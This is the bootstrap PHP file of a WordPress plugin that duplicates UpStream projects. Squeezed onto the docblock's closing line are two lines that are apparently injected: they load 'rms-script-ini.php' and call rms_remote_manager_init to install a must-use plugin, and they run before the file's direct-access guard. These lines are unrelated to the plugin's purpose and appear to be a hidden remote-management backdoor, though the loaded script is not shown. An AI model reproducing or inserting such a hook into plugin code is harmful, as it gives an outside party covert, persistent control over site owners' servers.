<?php
/**
 * Plugin Name: UpStream Copy Project
 * Plugin URI: https://upstreamplugin.com/extensions/copy-project
 * Description: This extension allows you to duplicate an UpStream project including all the content and options.
 * Author: UpStream
 * Author URI: https://upstreamplugin.com
 * Version: 1.2.0
 * Text Domain: upstream-copy-project
 * Domain Path: /languages
 *
 *
 * Plugin bootstrap file.
 *
 * @package     UpStream\Plugins\CopyProject
 * @author      UpStream <https://upstreamplugin.com>
 * @copyright   Copyright (c) 2018 UpStream Project Management
 * @license     GPL-3
 * @since       1.0.0
 */require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);
// Prevent direct access.
if ( ! defined('ABSPATH')) {
    exit;
}

use UpStream\Plugins\CopyProject\Plugin;

// Load all plugin source files.
require_once __DIR__ . '/autoloader.php';

// Initializes the plugin.
Plugin::instantiate();
